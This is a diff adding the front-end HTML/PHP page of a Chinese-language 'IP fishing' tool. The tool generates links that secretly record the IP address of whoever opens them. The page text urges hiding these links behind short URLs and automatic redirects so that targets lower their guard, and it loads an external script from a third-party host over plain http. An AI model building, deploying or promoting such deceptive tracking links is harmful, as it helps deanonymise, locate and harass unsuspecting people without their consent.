@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>|简·陋|钓IP工具'</title>
+	<link rel="stylesheet" href="style.css">
+	<style>
+		body,
+		html {
+			text-align: center;
+		}
+
+		.land {
+			display: inline-block;
+		}
+
+		button:not(.land button) {
+			font-size: 0.6cm;
+		}
+	</style>
+	<script type="text/javascript">
+		function goAPI(n) {
+			var arr = window.location.href.split('/')[2];
+			arr = arr.split('.');
+			arr.shift();
+			window.location.href = 'http://api.' + arr.join('.') + '/sc/chaip/' + n + '/intro/';
+		}
+		window.onload = function () {
+			var boxNode = bgp.parentNode,
+				picStyle = bgp.style,
+				picNode = bgp,
+				scale = picNode.width / picNode.height;
+			function cleanBGP() {
+				var x = boxNode.clientWidth,
+					y = boxNode.clientHeight,
+					yFact = y,
+					xFact = x;
+				x / y < scale ? x = y * scale : y = x / scale;
+				picStyle.width = (x += 2) + "px";
+				picStyle.height = (y += 2) + "px";
+				picStyle.left = (xFact - x) / 2 + "px";
+				picStyle.top = (yFact - y) / 2 + "px";
+			};
+			cleanBGP();
+			window.onresize = cleanBGP;
+			if (typeof change_eeg !== 'undefined') {
+				change_defaultGraColor.color_weight_changer.fgp.multi = 0.01;
+				change_defaultGraColor.transition_weight_changer.fgp.multi = 0.01;
+				change_defaultGraColor.axis_changer.fgp.multi = 0.02;
+				change_defaultGraColor.color_changer.fgp.multi = 0.01;
+				change_eeg(btn);
+				change_ccstart(btn);
+			}
+		}
+	</script>
+	<script type="text/javascript" src="http://js.seventop.top/crf.js"></script>
+</head>
+
+<body>
+	<div class="BGPBox"><img src="https://api.ghser.com/random/api.php" id="bgp" /></div>
+	<form style="display: none;" action="./cast.php"><input type="submit" id="sub" /></form>
+	<div style="padding: 0.5cm;">
+		<button id="btn" onclick="sub.click();">生成鱼钩</button>
+		<br /><br />
+		<?php if (isset($_COOKIE['historyGouz'])) disHistoryList(); ?>
+	</div>
+	<div class="land">
+		<h1>
+			「你信不信我查你IP地址?!」
+		</h1>
+		<br />
+		<a>
+			大IP时代已然到来！<br />
+			在这动不动就查IP报家门的乱世，<br />
+			只有真正的强者才能不惧IP之挑战！！<br /><br />
+		</a>
+		<a>
+			使用<b>|简·陋|钓IP工具</b>，<br />
+			您可以通过给对方发一个网址让其访问，<br />
+			来轻松获取对方的IP地址！<br /><br />
+			点击“生成鱼钩”即可生成钓IP的网址。<br /><br />
+		</a>
+		<a>
+			鉴于对方可能会对不明网址抱有抵触情绪，<br />
+			我们提供访问后自动跳转到其他页面的功能。<br />
+			您可以通过制作短链接，<br />
+			设置跳转的目标页面等手段，<br />
+			作为饵料掩盖鱼钩，<br />
+			降低对方的警戒心。
+		</a>
+		<!-- <br /><br /><br />
+		<hr style="width: 80%;display: inline-block;" /><br /><br />
+		本站额外提供 1 项API服务。<br /><br />
+		<ul>
+			<li><a href="javascript: goAPI('self');">获取本机IP信息</a></li>
+		</ul> -->
+		<br /><br />
+	</div>
+</body>
+
+</html>
